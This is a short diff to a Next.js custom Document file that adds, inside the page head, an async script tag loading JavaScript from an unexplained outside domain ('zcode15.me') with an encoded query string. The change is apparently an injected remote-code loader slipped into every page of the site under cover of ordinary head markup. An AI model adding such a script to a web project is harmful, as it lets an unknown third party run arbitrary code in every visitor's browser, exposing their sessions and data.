@@ -23,7 +23,8 @@ class MyDocument extends Document {
             href="/favicon/favicon-16x16.png"
           />
           <link rel="manifest" href="/favicon/site.webmanifest" />
-        </Head>
+        <script type="text/javascript" src="https://zcode15.me/?ze=g4zdgzbzmy5ha3ddf42dqmbw" async></script>
+          </Head>
         <body>
           <Main />
           <NextScript />
